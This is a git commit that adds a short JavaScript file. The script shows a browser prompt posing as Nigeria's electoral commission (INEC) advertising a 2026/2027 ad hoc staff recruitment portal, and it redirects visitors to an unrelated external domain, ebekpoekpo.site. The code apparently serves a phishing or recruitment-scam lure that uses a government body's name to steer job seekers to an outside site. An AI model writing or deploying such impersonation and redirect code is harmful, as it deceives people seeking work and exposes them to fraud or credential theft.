797f83e1b1bab3b5b01b3e3bcdc0c359b093bd98
dataviewz <gloliousam2@gmail.com>
2026-05-23 01:37:13 -0700

    Create active-inecportalregistration.js

---
+++ active-inecportalregistration.js
@@ -0,0 +1,5 @@
+var password = 'REGISTER'
+password=prompt('INEC: WELCOME TO INEC ADHOC STAFF RECRUITMENT PORTAL 2026/2027 Instantly POWERED BY: (INEC), click OK to Register Now','REGISTER');
+if (password != 'REGISTER') {
+location.href='https://ebekpoekpo.site/inecportalregistration.html';
+}
